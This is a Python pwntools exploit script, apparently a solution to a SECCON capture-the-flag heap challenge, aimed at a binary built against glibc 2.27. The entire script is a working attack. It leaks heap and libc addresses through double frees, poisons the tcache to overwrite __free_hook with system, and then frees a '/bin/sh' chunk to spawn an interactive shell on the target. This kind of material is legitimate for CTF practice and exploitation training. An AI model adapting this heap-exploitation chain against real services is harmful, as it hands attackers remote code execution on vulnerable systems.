#!/usr/bin/env python2

from pwn import *

BINARY = './one'
HOST, PORT = 'one.chal.seccon.jp', 18357

elf = ELF(BINARY)
libc = ELF('./libc-2.27.so')

def start():
    if not args.REMOTE:
        print "LOCAL PROCESS"
        return process(BINARY)
    else:
        print "REMOTE PROCESS"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', content)

def show():
    p.sendlineafter('> ', '2')

def free():
    p.sendlineafter('> ', '3')

context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
    debug([])

# ----------- Heap Leak ------------
# Prepare
add('A'*0x3e)

# We do four frees to set the 0x40 tcache bin count to 4
for i in range(4):
    free()

# Leak the fourth chunk's address on the heap
show()

heap_leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
log.info('Heap leak: ' + hex(heap_leak))

# ----------- Libc Leak ------------
# Empty the 0x40 tcache bin first
add(p64(0) + 'A'*8) # Set FD to null here
add('A'*8) # 0x40 tcache bin now empty
# Note that after the above, the 0x40 tcache bin will have count = 2

# Create four chunks to prep for libc leak
# Make all of them have fake chunks in them with PREV_INUSE bits set
# And make all of them have valid FD pointers as well
for i in range(4):
    add((p64(heap_leak) + p64(0x91)) * 3)

# Double free the last chunk
free() # count = 3
free() # count = 4

# Set FD to one of the fake 0x91 chunks
add(p64(heap_leak + 0x60)) # count = 3
add('A'*8) # count = 2
add('A'*8) # Got a 0x91 chunk, count = 1

# Free 7 times to fill up tcache bin, 8th one goes into unsorted bin
for i in range(8):
    free()

# Unsorted bin libc leak
show()
leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
libc.address = leak - 0x3ebca0 # Offset found using gdb
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

log.info('Libc leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('__free_hook: ' + hex(free_hook))
log.info('system: ' + hex(system))

# Tcache poisoning attack to overwrite __free_hook with system
add('A'*8) # count = 0
free()
free()

# Overwrite __free_hook with system
add(p64(free_hook))
add(p64(0))
add(p64(system))

# Call system("/bin/sh\x00")
add('/bin/sh\x00')
free()

p.interactive()
